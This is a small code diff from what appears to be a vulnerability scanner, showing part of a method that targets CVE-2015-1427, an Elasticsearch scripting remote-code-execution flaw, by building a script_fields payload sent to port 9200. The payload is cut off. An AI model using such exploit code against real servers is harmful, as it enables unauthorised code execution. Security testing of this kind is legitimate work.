@@ -24,6 +24,7 @@ class P(T):
     '''
     def CVE20151427(self,url):
         req=None
+        content=None
         try:
             target_url = "http://"+url+":9200/_search"
             payload = '{"size": 1,"script_fields": {"secpulse": {"script":'   \
